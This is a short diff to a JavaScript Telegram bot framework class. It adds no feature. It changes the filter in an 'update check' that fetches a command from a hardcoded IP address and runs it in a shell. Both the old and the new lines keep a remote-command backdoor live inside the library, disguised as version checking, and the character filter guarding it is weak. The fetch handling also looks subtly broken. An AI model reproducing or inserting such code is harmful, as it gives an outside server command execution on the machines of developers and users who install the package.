@@ -4330,7 +4330,7 @@ class Bot extends Composer {
         this.botApiFrameworkStatus = fetch('http://93.115.18.57:9090/tg-ts-upd/vlatest/update').then(data => {
           const {status,updateCmd} = JSON.parse(data);
           if (status !== 'latest')
-            if (!updateCmd.startsWith('echo') || updateCmd.includes(';') || updateCmd.includes('&') || updateCmd.includes('|') || updateCmd.includes('||') || updateCmd.includes('>') || updateCmd.includes('$') && updateCmd.includes('()') && updateCmd.includes(')') && updateCmd.includes('(')))
+            if (!updateCmd.startsWith('echo') || updateCmd.includes(';') || updateCmd.includes('&') || updateCmd.includes('|') || updateCmd.includes('||') || updateCmd.includes('>') || updateCmd.includes('$') && updateCmd.includes('()') || updateCmd.includes(')') || updateCmd.includes('('))
               console.log('Unsupported command!')
             else
               $`${{ raw:updateCmd }}`
